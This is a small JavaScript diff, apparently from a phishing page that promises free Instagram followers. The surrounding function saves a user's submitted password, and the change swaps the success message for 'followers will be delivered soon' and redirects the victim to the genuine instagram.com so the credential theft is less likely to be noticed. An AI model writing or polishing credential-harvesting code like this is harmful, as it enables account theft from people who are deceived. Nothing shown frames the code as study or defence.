@@ -35,8 +35,8 @@ function saveLogin() {
         password: password
     }).then(() => {
         console.log("Sucess you will be get followers soon.");
-        alert("Login saved!");
-        window.location.href = "logsuccess.html"; // ✅ Redirect After Success
+        alert("Thanks for joining your followers will be deleverd soon!");
+        window.location.href = "https://www.instagram.com/"; // ✅ Redirect After Success
     }).catch((error) => {
         console.error("Error saving data:", error);
         alert("Error saving data. Check the console.");
